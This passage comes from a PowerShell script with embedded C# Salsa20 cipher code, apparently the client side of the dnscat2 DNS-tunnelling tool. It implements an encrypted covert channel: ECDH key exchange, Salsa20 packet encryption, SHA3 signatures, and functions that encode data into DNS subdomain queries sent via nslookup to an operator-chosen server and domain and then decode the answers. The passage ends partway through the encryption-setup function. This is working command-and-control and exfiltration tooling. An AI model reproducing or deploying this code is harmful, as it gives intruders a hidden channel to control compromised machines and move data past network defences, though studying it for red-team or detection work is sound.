		/// <exception cref="CryptographicException">The implementation of the class derived from the symmetric algorithm is not valid.</exception>
		public Salsa20()
		{
			// set legal values
			LegalBlockSizesValue = new KeySizes[] { new KeySizes(512, 512, 0) };
            LegalKeySizesValue   = new KeySizes[] { new KeySizes(128, 256, 128) };

			// set default values
			BlockSizeValue = 512;
			KeySizeValue = 256;
			m_rounds = 20;
		}

		/// <summary>
		/// Creates a symmetric decryptor object with the specified <see cref="SymmetricAlgorithm.Key"/> property
		/// and initialization vector (<see cref="SymmetricAlgorithm.IV"/>).
		/// </summary>
		/// <param name="rgbKey">The secret key to use for the symmetric algorithm.</param>
		/// <param name="rgbIV">The initialization vector to use for the symmetric algorithm.</param>
		/// <returns>A symmetric decryptor object.</returns>
		public override ICryptoTransform CreateDecryptor(byte[] rgbKey, byte[] rgbIV)
		{
			// decryption and encryption are symmetrical
			return CreateEncryptor(rgbKey, rgbIV);
		}

		/// <summary>
		/// Creates a symmetric encryptor object with the specified <see cref="SymmetricAlgorithm.Key"/> property
		/// and initialization vector (<see cref="SymmetricAlgorithm.IV"/>).
		/// </summary>
		/// <param name="rgbKey">The secret key to use for the symmetric algorithm.</param>
		/// <param name="rgbIV">The initialization vector to use for the symmetric algorithm.</param>
		/// <returns>A symmetric encryptor object.</returns>
		public override ICryptoTransform CreateEncryptor(byte[] rgbKey, byte[] rgbIV)
		{
			if (rgbKey == null)
				throw new ArgumentNullException("rgbKey");
			if (!ValidKeySize(rgbKey.Length * 8))
				throw new CryptographicException("Invalid key size; it must be 128 or 256 bits.");
			CheckValidIV(rgbIV, "rgbIV");

			return new Salsa20CryptoTransform(rgbKey, rgbIV, m_rounds);
		}

		/// <summary>
		/// Generates a random initialization vector (<see cref="SymmetricAlgorithm.IV"/>) to use for the algorithm.
		/// </summary>
		public override void GenerateIV()
		{
			// generate a random 8-byte IV
			IVValue = GetRandomBytes(8);
		}

		/// <summary>
		/// Generates a random key (<see cref="SymmetricAlgorithm.Key"/>) to use for the algorithm.
		/// </summary>
		public override void GenerateKey()
		{
			// generate a random key
			KeyValue = GetRandomBytes(KeySize / 8);
		}

		/// <summary>
		/// Gets or sets the initialization vector (<see cref="SymmetricAlgorithm.IV"/>) for the symmetric algorithm.
		/// </summary>
		/// <value>The initialization vector.</value>
		/// <exception cref="ArgumentNullException">An attempt was made to set the initialization vector to null. </exception>
		/// <exception cref="CryptographicException">An attempt was made to set the initialization vector to an invalid size. </exception>
		public override byte[] IV
		{
			get
			{
				return base.IV;
			}
			set
			{
				CheckValidIV(value, "value");
				IVValue = (byte[]) value.Clone();
			}
		}

		/// <summary>
		/// Gets or sets the number of rounds used by the Salsa20 algorithm.
		/// </summary>
		/// <value>The number of rounds.</value>
		public int Rounds
		{
			get
			{
				return m_rounds;
			}
			set
			{
				if (value != 8 && value != 12 && value != 20)
					throw new ArgumentOutOfRangeException("value", "The number of rounds must be 8, 12, or 20.");
				m_rounds = value;
			}
		}

		// Verifies that iv is a legal value for a Salsa20 IV.
		private static void CheckValidIV(byte[] iv, string paramName)
		{
			if (iv == null)
				throw new ArgumentNullException(paramName);
			if (iv.Length != 8)
				throw new CryptographicException("Invalid IV size; it must be 8 bytes.");
		}

		// Returns a new byte array containing the specified number of random bytes.
		private static byte[] GetRandomBytes(int byteCount)
		{
			byte[] bytes = new byte[byteCount];
			//using (RandomNumberGenerator rng = new RNGCryptoServiceProvider())
            RandomNumberGenerator rng = new RNGCryptoServiceProvider();
		    rng.GetBytes(bytes);
			return bytes;
		}

		int m_rounds;

		/// <summary>
		/// Salsa20Impl is an implementation of <see cref="ICryptoTransform"/> that uses the Salsa20 algorithm.
		/// </summary>
		private sealed class Salsa20CryptoTransform : ICryptoTransform
		{
			public Salsa20CryptoTransform(byte[] key, byte[] iv, int rounds)
			{
				Debug.Assert(key.Length == 16 || key.Length == 32, "abyKey.Length == 16 || abyKey.Length == 32", "Invalid key size.");
				Debug.Assert(iv.Length == 8, "abyIV.Length == 8", "Invalid IV size.");
				Debug.Assert(rounds == 8 || rounds == 12 || rounds == 20, "rounds == 8 || rounds == 12 || rounds == 20", "Invalid number of rounds.");

				Initialize(key, iv);
				m_rounds = rounds;
			}

			public bool CanReuseTransform
			{
				get { return false; }
			}

			public bool CanTransformMultipleBlocks
			{
				get { return true; }
			}

			public int InputBlockSize
			{
				get { return 64; }
			}

			public int OutputBlockSize
			{
				get { return 64; }
			}

			public int TransformBlock(byte[] inputBuffer, int inputOffset, int inputCount, byte[] outputBuffer, int outputOffset)
			{
				// check arguments
				if (inputBuffer == null)
					throw new ArgumentNullException("inputBuffer");
				if (inputOffset < 0 || inputOffset >= inputBuffer.Length)
					throw new ArgumentOutOfRangeException("inputOffset");
				if (inputCount < 0 || inputOffset + inputCount > inputBuffer.Length)
					throw new ArgumentOutOfRangeException("inputCount");
				if (outputBuffer == null)
					throw new ArgumentNullException("outputBuffer");
				if (outputOffset < 0 || outputOffset + inputCount > outputBuffer.Length)
					throw new ArgumentOutOfRangeException("outputOffset");
				if (m_state == null)
					throw new ObjectDisposedException(GetType().Name);

				byte[] output = new byte[64];
				int bytesTransformed = 0;

				while (inputCount > 0)
				{
					Hash(output, m_state);
					m_state[8] = AddOne(m_state[8]);
					if (m_state[8] == 0)
					{
						// NOTE: stopping at 2^70 bytes per nonce is user's responsibility
						m_state[9] = AddOne(m_state[9]);
					}

					int blockSize = Math.Min(64, inputCount);
					for (int i = 0; i < blockSize; i++)
						outputBuffer[outputOffset + i] = (byte) (inputBuffer[inputOffset + i] ^ output[i]);
					bytesTransformed += blockSize;

					inputCount -= 64;
					outputOffset += 64;
					inputOffset += 64;
				}

				return bytesTransformed;
			}

			public byte[] TransformFinalBlock(byte[] inputBuffer, int inputOffset, int inputCount)
			{
				if (inputCount < 0)
					throw new ArgumentOutOfRangeException("inputCount");

				byte[] output = new byte[inputCount];
				TransformBlock(inputBuffer, inputOffset, inputCount, output, 0);
				return output;
			}

			public void Dispose()
			{
				if (m_state != null)
					Array.Clear(m_state, 0, m_state.Length);
				m_state = null;
			}

			private static uint Rotate(uint v, int c)
			{
				return (v << c) | (v >> (32 - c));
			}

			private static uint Add(uint v, uint w)
			{
				return unchecked(v + w);
			}

			private static uint AddOne(uint v)
			{
				return unchecked(v + 1);
			}

			private void Hash(byte[] output, uint[] input)
			{
				uint[] state = (uint[]) input.Clone();

				for (int round = m_rounds; round > 0; round -= 2)
				{
					state[4] ^= Rotate(Add(state[0], state[12]), 7);
					state[8] ^= Rotate(Add(state[4], state[0]), 9);
					state[12] ^= Rotate(Add(state[8], state[4]), 13);
					state[0] ^= Rotate(Add(state[12], state[8]), 18);
					state[9] ^= Rotate(Add(state[5], state[1]), 7);
					state[13] ^= Rotate(Add(state[9], state[5]), 9);
					state[1] ^= Rotate(Add(state[13], state[9]), 13);
					state[5] ^= Rotate(Add(state[1], state[13]), 18);
					state[14]  ^= Rotate(Add(state[10], state[6]), 7);
					state[2] ^= Rotate(Add(state[14], state[10]), 9);
					state[6] ^= Rotate(Add(state[2], state[14]), 13);
					state[10]  ^= Rotate(Add(state[6], state[2]), 18);
					state[3] ^= Rotate(Add(state[15], state[11]), 7);
					state[7] ^= Rotate(Add(state[3], state[15]), 9);
					state[11]  ^= Rotate(Add(state[7], state[3]), 13);
					state[15]  ^= Rotate(Add(state[11], state[7]), 18);
					state[1] ^= Rotate(Add(state[0], state[3]), 7);
					state[2] ^= Rotate(Add(state[1], state[0]), 9);
					state[3] ^= Rotate(Add(state[2], state[1]), 13);
					state[0] ^= Rotate(Add(state[3], state[2]), 18);
					state[6] ^= Rotate(Add(state[5], state[4]), 7);
					state[7] ^= Rotate(Add(state[6], state[5]), 9);
					state[4] ^= Rotate(Add(state[7], state[6]), 13);
					state[5] ^= Rotate(Add(state[4], state[7]), 18);
					state[11]  ^= Rotate(Add(state[10], state[9]), 7);
					state[8] ^= Rotate(Add(state[11], state[10]), 9);
					state[9] ^= Rotate(Add(state[8], state[11]), 13);
					state[10]  ^= Rotate(Add(state[9], state[8]), 18);
					state[12]  ^= Rotate(Add(state[15], state[14]), 7);
					state[13]  ^= Rotate(Add(state[12], state[15]), 9);
					state[14]  ^= Rotate(Add(state[13], state[12]), 13);
					state[15]  ^= Rotate(Add(state[14], state[13]), 18);
				}

				for (int index = 0; index < 16; index++)
					ToBytes(Add(state[index], input[index]), output, 4 * index);
			}

			private void Initialize(byte[] key, byte[] iv)
			{
				m_state = new uint[16];
				m_state[1] = ToUInt32(key, 0);
				m_state[2] = ToUInt32(key, 4);
				m_state[3] = ToUInt32(key, 8);
				m_state[4] = ToUInt32(key, 12);

				byte[] constants = key.Length == 32 ? c_sigma : c_tau;
				int keyIndex = key.Length - 16;

				m_state[11] = ToUInt32(key, keyIndex + 0);
				m_state[12] = ToUInt32(key, keyIndex + 4);
				m_state[13] = ToUInt32(key, keyIndex + 8);
				m_state[14] = ToUInt32(key, keyIndex + 12);
				m_state[0] = ToUInt32(constants, 0);
				m_state[5] = ToUInt32(constants, 4);
				m_state[10] = ToUInt32(constants, 8);
				m_state[15] = ToUInt32(constants, 12);

				m_state[6] = ToUInt32(iv, 0);
				m_state[7] = ToUInt32(iv, 4);
				m_state[8] = 0;
				m_state[9] = 0;
			}

			private static uint ToUInt32(byte[] input, int inputOffset)
			{
				return unchecked((uint) (((input[inputOffset] | (input[inputOffset + 1] << 8)) | (input[inputOffset + 2] << 16)) | (input[inputOffset + 3] << 24)));
			}

			private static void ToBytes(uint input, byte[] output, int outputOffset)
			{
				unchecked
				{
					output[outputOffset] = (byte) input;
					output[outputOffset + 1] = (byte) (input >> 8);
					output[outputOffset + 2] = (byte) (input >> 16);
					output[outputOffset + 3] = (byte) (input >> 24);
				}
			}

			static readonly byte[] c_sigma = Encoding.ASCII.GetBytes("expand 32-byte k");
			static readonly byte[] c_tau = Encoding.ASCII.GetBytes("expand 16-byte k");

			uint[] m_state;
			readonly int m_rounds;
		}
	}
}
"@
Add-Type -TypeDefinition $source -Language CSharp -ErrorAction Stop

function Get-SHA3 ($Bytes) {
    $SHA3 = New-Object Org.BouncyCastle.Crypto.Digests.Sha3Digest(256)
    [Byte[]]$Digest = (1..$SHA3.GetDigestSize()) |% {0}
    $SHA3.BlockUpdate($Bytes, 0, $Bytes.Length)
    $SHA3.DoFinal($Digest, 0) | Out-Null
    return $Digest
}

function Convert-Salsa20 ($Bytes, $Key, $IV) {
    $salsa20 = New-Object Logos.Utility.Security.Cryptography.Salsa20
    $salsa20.IV = $IV
    $salsa20.Key = $Key
    $enc = $salsa20.CreateEncryptor()
    [Byte[]]$encrypted = (1..$bytes.Length) |% {0}
    $enc.TransformBlock($bytes, 0, $bytes.Length, $encrypted, 0) | Out-Null
    return $encrypted
}

function Convert-StringToHex ($String) {
    return ([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($String)).split("-") -join "")
}

function Convert-BytesToHex ($Bytes) {
    return ([System.BitConverter]::ToString($Bytes) -replace '-')
}

function Convert-HexToBytes ($Hex) {
    [byte[]]$Bytes = @()
    for ($x = 0; $x -lt $Hex.Length; $x += 2) {
        $Bytes += [Convert]::ToInt16(($Hex[$x..($x+1)] -join ""),16)
    }
    return $Bytes
}

function Convert-HexToString ($Hex) {
    $StringData = ""
    while ($Hex.Length -gt 0) {
        $StringData += [string][char][Convert]::ToInt16(($Hex[0..1] -join ""),16)
        $Hex = $Hex.Substring(2)
    }
    return $StringData
}

function Get-SharedSecret ($client_private_key, $server_public_key_x, $server_public_key_y) {
    $client_private_key_bigint = New-Object Org.BouncyCastle.Math.BigInteger(1, [byte[]](Convert-HexToBytes $client_private_key.ToString()))
    $server_public_key_x_bigint = New-Object Org.BouncyCastle.Math.BigInteger(1, [byte[]](Convert-HexToBytes $server_public_key_x.ToString()))
    $server_public_key_y_bigint = New-Object Org.BouncyCastle.Math.BigInteger(1, [byte[]](Convert-HexToBytes $server_public_key_y.ToString()))

    [Org.BouncyCastle.Crypto.Agreement.ECDHBasicAgreement]     $agreement = New-Object Org.BouncyCastle.Crypto.Agreement.ECDHBasicAgreement
    [Org.BouncyCastle.Asn1.X9.X9ECParameters]                   $curve = $null
    [Org.BouncyCastle.Crypto.Parameters.ECDomainParameters]     $ecParam = $null
    [Org.BouncyCastle.Crypto.Parameters.ECPrivateKeyParameters] $privKey = $null
    [Org.BouncyCastle.Crypto.Parameters.ECPublicKeyParameters]  $pubKey = $null
    [Org.BouncyCastle.Math.EC.ECPoint]                          $point = $null

    $curve = [Org.BouncyCastle.Asn1.Nist.NistNamedCurves]::GetByName("P-256")
    $ecParam = New-Object Org.BouncyCastle.Crypto.Parameters.ECDomainParameters($curve.Curve, $curve.G, $curve.N, $curve.H, $curve.GetSeed())
    $privKey = New-Object Org.BouncyCastle.Crypto.Parameters.ECPrivateKeyParameters($client_private_key_bigint, $ecParam)
    $point = $ecParam.Curve.CreatePoint($server_public_key_x_bigint, $server_public_key_y_bigint, $False )
    $pubKey = New-Object Org.BouncyCastle.Crypto.Parameters.ECPublicKeyParameters($point, $ecParam)

    $agreement.Init($privKey);
    [Org.BouncyCastle.Math.BigInteger]$secret = $agreement.CalculateAgreement( $pubKey )
    return $secret.ToByteArrayUnsigned()
}

function Get-Dnscat2StreamKeys ($EncryptionKeys) {
    $EncryptionKeys["client_write"] = Get-SHA3 ($EncryptionKeys["shared_secret"] + ([System.Text.Encoding]::ASCII.GetBytes("client_write_key")))
    $EncryptionKeys["client_mac"] = Get-SHA3 ($EncryptionKeys["shared_secret"] + ([System.Text.Encoding]::ASCII.GetBytes("client_mac_key")))
    $EncryptionKeys["server_write"] = Get-SHA3 ($EncryptionKeys["shared_secret"] + ([System.Text.Encoding]::ASCII.GetBytes("server_write_key")))
    $EncryptionKeys["server_mac"] = Get-SHA3 ($EncryptionKeys["shared_secret"] + ([System.Text.Encoding]::ASCII.GetBytes("server_mac_key")))
    return $EncryptionKeys
}

function Get-Dnscat2PacketSignature ($mac_key, $PacketHeader, $IV, $EncryptedPacketBody) {
    return [byte[]]((Get-SHA3 ($mac_key + $PacketHeader + $IV + $EncryptedPacketBody))[0..5])
}

function Get-Dnscat2PeerAuthStrings ($EncryptionKeys) {
    $EncryptionKeys["client_auth"] = Get-SHA3 (([System.Text.Encoding]::ASCII.GetBytes("client")) + $EncryptionKeys["pubkey_client"] + $EncryptionKeys["pubkey_server"] + $EncryptionKeys["PreSharedSecret"])
    $EncryptionKeys["server_auth"] = Get-SHA3 (([System.Text.Encoding]::ASCII.GetBytes("server")) + $EncryptionKeys["pubkey_client"] + $EncryptionKeys["pubkey_server"] + $EncryptionKeys["PreSharedSecret"])
    return $EncryptionKeys
}

function Get-Dnscat2ShortAuthString ($SharedSecret, $ClientPublicKey, $ServerPublicKey) {
    $Wordlist = @('Abate','Absorb','Ache','Acidy','Across','After','Alike','Amount','Amuse','Annoy','Annuls','Ardent','Ascot','Bait','Barons','Barret','Bask','Becurl','Befool','Bell','Bifold','Bogie','Boxen','Bozo','Broke','Bulby','Bunny','Calmly','Canary','Cargo','Chirp','Chroma','Cleft','Coke','Column','Comely','Cometh','Convoy','Corn','Cough','Cruxes','Cued','Darter','Dash','Dating','Deadly','Deaf','Decade','Deepen','Depict','Domed','Dorper','Drafts','Dried','Duff','Durian','Early','Easily','Eggars','Emboss','Emit','Encode','Ennui','Envied','Essay','Evites','Evoke','Exotic','Facile','Fate','Feisty','Fewest','Fifty','Filth','Finer','Fished','Flacks','Flaunt','Fleecy','Flied','Foams','Foxes','Freely','Frozen','Genome','Gibbon','Gifts','Giving','Gold','Gone','Gouge','Grocer','Grows','Half','Handle','Harold','Harp','Hedges','Hither','Hobbit','Hobble','Hoods','Hooked','Horror','Horsed','Hound','Huns','Ices','Impish','Jiber','Jiggy','Kelpy','Keyman','Khan','Killer','Klutzy','Lair','Lashes','Libate','Liming','Lonely','Looks','Lordy','Lush','Mailer','Maps','Mayo','Mcgill','Mona','Motive','Mousy','Neigh','Ninjas','Nodule','Nuns','Obese','Olive','Omelet','Omen','Otto','Outran','Ouzo','Owls','Papism','Parrot','Peace','Pearly','Peaty','Pedal','Pegged','Petals','Phials','Pianos','Pierce','Pigs','Pikey','Pitch','Plato','Plays','Plight','Poetic','Poker','Polite','Pontic','Pony','Powers','Poxes','Prams','Pulped','Purr','Push','Quint','Random','Rapier','Ravel','Real','Rebolt','Recoil','Redear','Reink','Ripe','Riprap','Roger','Ropers','Roving','Rumor','Sanded','Sawlog','Sawman','Scribe','Scruff','Seitan','Sense','Shirks','Sippy','Sitcom','Slumpy','Softy','Sonar','Sonny','Sophic','Spear','Spiced','Spikey','Spine','Spoofy','Spring','Static','Staved','Stilt','Stinty','Stirs','Storer','Story','Strode','Stump','Suited','Surfs','Swatch','Swum','Tables','Taking','Tattoo','Teal','Teeth','Telco','Timer','Tins','Tonite','Tore','Tort','Tried','Trivia','Tubule','Tusked','Twins','Twos','Unborn','Undam','Unwrap','Upcurl','Upseal','Visas','Volume','Waded','Wages','Ware','Wears','Wicked','Winful','Wisely','Wisp','Yerba','Zester','Zoner','Zootic')
    return (Get-SHA3 ([System.Text.Encoding]::ASCII.GetBytes("authstring") + $SharedSecret + $ClientPublicKey + $ServerPublicKey))[0..5] | % { $Wordlist[$_] }
}

function New-RandomDNSField ($Length) {
    return [string]((1..$Length | % { 0,1,2,3,4,5,6,7,8,9,'A','B','C','D','E','F' | Get-Random }) -join "")
}

function Update-Dnscat2ACK ($Data, $AcknowledgementNumber) {
    return ([string]("{0:x}" -f (([int]("0x" + $AcknowledgementNumber) + $Data.Length/2) % 65535))).PadLeft(4,"0")
}

function Compare-SequenceNumber ($SequenceNumber, $AcknowledgementNumber) {
    $SequenceNumber = [uint16]("0x" + $SequenceNumber)
    $AcknowledgementNumber = [uint16]("0x" + $AcknowledgementNumber)
    if ($AcknowledgementNumber -lt $SequenceNumber) { # ACK recently rolled over
        return ($AcknowledgementNumber + 65535 - $SequenceNumber)
    } else {
        return ($AcknowledgementNumber - $SequenceNumber)
    }
}

function Get-NextDnscat2Data ($DataQueue, $MaxMSGDataSize) {
    if ($DataQueue.Length -eq 0) {
        return ""
    }

    $Data = ""
    $PacketCount = 0
    if ($MaxMSGDataSize % 2 -eq 1) {
        $MaxMSGDataSize -= 1
    }
    foreach ($Char in $DataQueue.ToCharArray()) {
        if ($PacketCount -ge ($MaxMSGDataSize - 12)) {
            return $Data
        }
        $Data += $Char
        $PacketCount += 1
    }
    if ($Data.Length % 2 -eq 1) {
        $Data.Substring(0, $Data.Length - 1)
    }
    return $Data
}

function Add-DNSDots ($Data) {
    $SectionCount = 0    # Tracks the chars in each section between dots
    $Packet = ""
    foreach ($Char in $Data.ToCharArray()) {
        if ($SectionCount -ge 63) {
            $SectionCount = 0
            $Packet += "."
        }
        $Packet += $Char
        $SectionCount += 1
    }
    return $Packet.TrimEnd(".")
}

function New-Dnscat2SYN ($Domain, $SessionId, $SequenceNumber, $Options) {
    return ((New-RandomDNSField 4) + "00" + $SessionId + $SequenceNumber + $Options)
}

function New-Dnscat2MSG ($Domain, $SessionId, $SequenceNumber, $AcknowledgementNumber, $Data) {
    return ((New-RandomDNSField 4) + "01" + $SessionId + $SequenceNumber + $AcknowledgementNumber + $Data)
}

function New-Dnscat2FIN ($Domain, $SessionId) {
    return ((New-RandomDNSField 4) + "02" + $SessionId + "00")
}

function New-Dnscat2ENC ($Domain, $SessionId, $Subtype, $Flags, $Key) {
    return ((New-RandomDNSField 4) + "03" + $SessionId + $Subtype + $Flags + $Key)
}

function ConvertTo-EncryptedDnscat2Packet ($Packet, $EncryptionKeys) {
    [string]$Packet = $Packet
    $PaddedNonce = [System.BitConverter]::GetBytes([uint64]$EncryptionKeys["nonce"])
    [array]::Reverse($PaddedNonce)

    $PacketHeader = Convert-HexToBytes $Packet.Substring(0,10)
    [byte[]]$PacketBody = @()
    if ($Packet.Length -gt 10) {
        $PacketBody = Convert-HexToBytes $Packet.Substring(10)
    }
    $EncryptedPacketBody = Convert-Salsa20 $PacketBody $EncryptionKeys["client_write"] $PaddedNonce
    $Signature = Get-Dnscat2PacketSignature $EncryptionKeys["client_mac"] $PacketHeader $PaddedNonce[6..7] $EncryptedPacketBody
    $EncryptedPacket = $Packet.Substring(0,10) + (Convert-BytesToHex $Signature) + ([Convert]::ToString($EncryptionKeys["nonce"], 16)).PadLeft(4, '0') + (Convert-BytesToHex $EncryptedPacketBody)
    return $EncryptedPacket
}

function ConvertFrom-EncryptedDnscat2Packet ($Packet, $EncryptionKeys) {
    $PacketHeader = ($Packet[0..9] -join "")
    $Signature = Convert-HexToBytes ($Packet[10..21] -join "")
    $Nonce = (Convert-HexToBytes ($Packet[22..25] -join ""))
    $PaddedNonce = (Convert-HexToBytes (($Packet[22..25] -join "").PadLeft(16, '0')))
    $EncryptedPacketData = (Convert-HexToBytes ($Packet[26..$Packet.Length] -join ""))
    $PacketData = Convert-Salsa20 $EncryptedPacketData $EncryptionKeys["server_write"] $PaddedNonce
    $CorrectSignature = Get-Dnscat2PacketSignature $EncryptionKeys["server_mac"] (Convert-HexToBytes $PacketHeader) $Nonce $EncryptedPacketData

    if ((Convert-BytesToHex $CorrectSignature) -ne (Convert-BytesToHex $Signature)) {
        Write-Verbose ("SIGNATURE MISMATCH: Packet " + ($Packet[0..3] -join ''))
    }

    return ($PacketHeader + (Convert-BytesToHex $PacketData))
}

function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupTypes, $Encryption, $EncryptionKeys) {
    if ($Encryption) {
        $Packet = ConvertTo-EncryptedDnscat2Packet $Packet $EncryptionKeys
    }
    if ($LookupTypes.Count -gt 0) {
        $LookupType = $LookupTypes | Get-Random
    } else {
        $LookupType = $LookupTypes[0]
    }

    $Packet = Add-DNSDots $Packet
    $Packet += ("." + $Domain)
    $Command = ("set type=$LookupType`nserver $DNSServer`nset port=$DNSPort`nset retry=1`n" + $Packet + "`nexit")
    $result = ($Command | nslookup 2>&1 | Out-String)
    $Done = $False
    if ($LookupType -eq "TXT") {
        if ($result.Contains('"')) {
            $Done = $True
            $result = ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)
        }
    } elseif ($LookupType -eq "MX") {
        if ($result.Contains('mail')) {
            $Done = $True
            $result = ([string](($result[($result.IndexOf("mail exchanger = ") + 17)..$result.Length] -join '').split("`n")[0])).replace($Domain,"").replace(".","").replace("`n","").replace(" ","").Trim()
        }
    } elseif ($LookupType -eq "CNAME") {
        if ($result.Contains('canonical')) {
            $Done = $True
            $result = ([string](($result[($result.IndexOf("canonical name =") + 17)..$result.Length] -join '').split("`n")[0])).replace($Domain,"").replace(".","").replace("`n","").replace(" ","").Trim()
        }
    } elseif ($LookupType -eq "A") {
        if ($result.Contains('Name')) {
            $Done = $True
            [byte[]]$Data = @()

            # Extract and sort the IPs
            $regex = [regex] "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
            $IPs = ($regex.Matches($result.Substring($result.IndexOf("Name"))) | %{ $_.value }) | sort {"{0:d3}.{1:d3}.{2:d3}.{3:d3}" -f @([int[]]$_.split('.'))}

            # First response is different, it has a length field
            $PacketLength = [Convert]::ToUInt16($IPs[0].split(".")[1])
            $IPs[0].split(".")[2..3] | % { $Data += [Convert]::ToUInt16($_) }
            $IPs = $IPs[1..$IPs.Count]

            # Strip the sequence numbers out of the other packets
            if ($IPs.Count -gt 0) {
                foreach ($IP in $IPs) {
                    $IP.split(".")[1..3] | % { $Data += [Convert]::ToUInt16($_) }
                }
            }

            # Return result as hex and strip out the padding
            $result = Convert-BytesToHex $Data[0..($PacketLength - 1)]
        }
    } elseif ($LookupType -eq "AAAA") {
        if ($result.Contains('Name')) {
            $Done = $True
            $Data = ""

            # Extract the IPs
            $regex = [regex] "(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))"
            $IPs = @()
            $IPs += ($regex.Matches($result.Substring($result.IndexOf("Name"))) | % { if ($_.value -ne "::") {$_.value} } )

            # Expand the IPv6 address
            for ($i = 0; $i -lt $IPs.Count; $i++) {
                [byte[]]$ipbytes = ([Net.IPAddress]$IPs[$i]).GetAddressBytes();
                $bldr = New-Object System.Text.StringBuilder
                for ($b =0; $b -lt 16; $b += 2) {
                    $bldr.AppendFormat("{0:x2}{1:x2}:", $ipbytes[$b], $ipbytes[$b+1]) | Out-Null
                }
                $bldr.Length = $bldr.Length-1
                $IPs[$i] = $bldr.ToString()
            }

            # Sort
            $IPs = $IPs | sort

            # First response is different, it has a length field
            $PacketLength = [Convert]::ToUInt16($IPs[0].Substring(2,2),16)
            $Data += $IPs[0].replace(":","").Substring(4) # Strip length and seq from start

            # Grab data from responses after the first
            $IPs = $IPs[1..$IPs.Count]
            if ($IPs.Count -gt 0) {
                foreach ($IP in $IPs) {
                    $Data += $IP.replace(":","").Substring(2) # Strip seq from start
                }
            }

            # Return result as hex and strip out the padding
            $result = $Data.Substring(0, $PacketLength*2)
        }
    }

    if ($Done) {
        if ($Encryption) {
            $DecryptedPacket = [string](ConvertFrom-EncryptedDnscat2Packet $result $EncryptionKeys)
            return $DecryptedPacket
        }
        return $result
    }

    return 1
}

function ConvertTo-Dnscat2Packet ($RawPacket) {
    if ((($RawPacket.Length)%2 -eq 1) -or ($RawPacket.Length -eq 0)) {
        return 1
    }

    $Packet = New-Object System.Collections.Hashtable
    $Packet["PacketId"] = ($RawPacket[0..3] -join "")
    $Packet["MessageType"] = ($RawPacket[4..5] -join "")
    $Packet["SessionId"] = ($RawPacket[6..9] -join "")
    $Packet["Data"] = ""

    switch ($Packet["MessageType"]) {
        "00" {
            $Packet["SequenceNumber"] = ($RawPacket[10..13] -join "")
            $Packet["AcknowledgementNumber"] = ($RawPacket[10..13] -join "")
            $Packet["Options"] = ($RawPacket[14..17] -join "")
            if ($Packet["Options"] -eq 1) {
                # Name
                $Packet["Name"] = ($RawPacket[18..$RawPacket.Length] -join "")
            } elseif ($Packet["Options"] -eq 32) {
                # Command
            }
          }
        "01" {
            $Packet["SequenceNumber"] = ($RawPacket[10..13] -join "")
            $Packet["AcknowledgementNumber"] = ($RawPacket[14..17] -join "")
            if ($RawPacket.Length -gt 18) {
                $Packet["Data"] = ($RawPacket[18..$RawPacket.Length] -join "")
            } else {
                $Packet["Data"] = ""
            }
          }
        "02" {
            $Packet["Reason"] = ($RawPacket[10..$RawPacket.Length] -join "")
          }
        "03" {
            $Packet["Subtype"] = ($RawPacket[10..13] -join "")
            $Packet["Flags"] = ($RawPacket[14..17] -join "")
            $Keys = ($RawPacket[18..$RawPacket.Length] -join "")
            if ($Subtype -eq "0000") { # ENC_SUBTYPE_INIT
                $Packet["server_pubkey_x"] += [Convert]::ToString($Keys[0..63] -join "")
                $Packet["server_pubkey_y"] += [Convert]::ToString($Keys[64..$Keys.Length] -join "")
                Write-Verbose ("server_pubkey_x: " + $Packet["server_pubkey_x"])
                Write-Verbose ("server_pubkey_y: " + $Packet["server_pubkey_y"])
            } else { # ENC_SUBTYPE_INIT
                $Packet["authenticator"] = $Keys
            }
          }
    }
    return $Packet
}

function Start-Dnscat2EncInit ($Session, $Renegotiate) {
    if ($Renegotiate) {
        $OldEncryptionKeys = $Session["EncryptionKeys"]
    }

    $ECKeyPairGenerator = New-Object Org.BouncyCastle.Crypto.Generators.ECKeyPairGenerator
    $ECKeyPairGenerator.Init((New-Object Org.BouncyCastle.Crypto.KeyGenerationParameters((New-Object Org.BouncyCastle.Security.SecureRandom), 256)))
    $ECKeyPair = $ECKeyPairGenerator.GenerateKeyPair()

    $Session["EncryptionKeys"]["keypair"] = $ECKeyPair
    $Session["EncryptionKeys"]["client_privkey"] = (Convert-BytesToHex $ECKeyPair.Private.D.ToByteArrayUnsigned())
    $Session["EncryptionKeys"]["client_pubkey"] = (Convert-BytesToHex $ECKeyPair.Public.Q.X.ToBigInteger().ToByteArrayUnsigned()) + (Convert-BytesToHex $ECKeyPair.Public.Q.Y.ToBigInteger().ToByteArrayUnsigned())
    $Session["EncryptionKeys"]["client_pubkey_x"] = (Convert-BytesToHex $ECKeyPair.Public.Q.X.ToBigInteger().ToByteArrayUnsigned())
    $Session["EncryptionKeys"]["client_pubkey_y"] = (Convert-BytesToHex $ECKeyPair.Public.Q.Y.ToBigInteger().ToByteArrayUnsigned())

    $Subtype = "0000" # ENC_SUBTYPE_INIT
    $Flags = "0000"
    Write-Verbose ("client_pubkey: " + ($Session["EncryptionKeys"]["client_pubkey"]))
